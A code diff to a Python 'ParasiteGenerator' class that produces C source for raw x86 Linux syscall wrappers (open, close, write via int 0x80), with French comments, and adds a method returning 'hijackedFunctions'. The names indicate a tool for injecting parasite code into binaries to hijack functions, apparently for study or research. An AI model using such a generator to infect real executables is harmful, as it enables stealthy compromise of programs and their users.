@@ -113,20 +113,75 @@ class ParasiteGenerator():
     
     def getSourceCodeOfWriteFunction(self):
         function = '''
-static int _write (int fd, void *buf, int count)
-{
-  long ret;
- 
-  __asm__ __volatile__ ("pushl %%ebx\\n\\t"
-                        "movl %%esi,%%ebx\\n\\t"
-                        "int $0x80\\n\\t" "popl %%ebx":"=a" (ret)
-                        :"0" (SYS_write), "S" ((long) fd),
-                        "c" ((long) buf), "d" ((long) count));
-  if (ret >= 0) {
-    return (int) ret;
-  }
-  return -1;
-}'''
+static int _open(char * filename) {
+    /**
+     * sys_open :
+     * %eax <- 5
+     * %ebx <- const char *
+     * %ecx <- int
+     * %edx <- int
+     */
+    long id_fd;
+    
+    __asm__ __volatile__
+    (        "pushl %%ebx\\n\\t"        // sauvegarde EBX
+            "movl %%esi,%%ebx\\n\\t"    // on met ESI dans EBX
+            "mov $65, %%cl\\n\\t"        // on set le flag
+            "mov $420, %%dx\\n\\t"
+            "int $0x80\\n\\t"
+            "popl %%ebx"
+            :"=a" (id_fd) //EAX
+            :"a" (SYS_open),
+            "S" ((long) filename),//ESI
+            "d" ((long) 0)//EDX
+    );
+
+    if (id_fd >= 0) {
+        return (int) id_fd;
+    }
+    return -1;
+}
+
+static void _close(int fd) {
+
+    /**
+     * sys_close :
+     * %eax <- 6
+     * %ebx <- fd
+     */
+    __asm__ __volatile__
+    (        "pushl %%ebx\\n\\t"        // sauvegarde EBX
+            "movl %%esi,%%ebx\\n\\t"    // on met ESI dans EBX
+            "int $0x80\\n\\t"
+            "popl %%ebx"
+            : /* no output */
+            :"a" (SYS_close),
+            "S" ((long) fd)//ESI
+    );
+
+}
+
+static int _write(int fd, void *buf, int count) {
+    long ret;
+
+    __asm__ __volatile__
+    (
+            "pushl %%ebx\\n\\t"
+            "movl %%esi,%%ebx\\n\\t"
+            "int $0x80\\n\\t"
+            "popl %%ebx"
+            :"=a" (ret)
+            :"a" (SYS_write),
+            "S" ((long) fd),
+            "c" ((long) buf),
+            "d" ((long) count)
+    );
+    if (ret >= 0) {
+        return (int) ret;
+    }
+    return -1;
+}        
+'''
         return function
     
     def getSourceCodeParasiteCoreFunctions(self):
@@ -137,7 +192,8 @@ static int _write (int fd, void *buf, int count)
         
         return coreFunctions
         
-        
+    def getFunctions(self):
+        return self.hijackedFunctions    
         
         
     
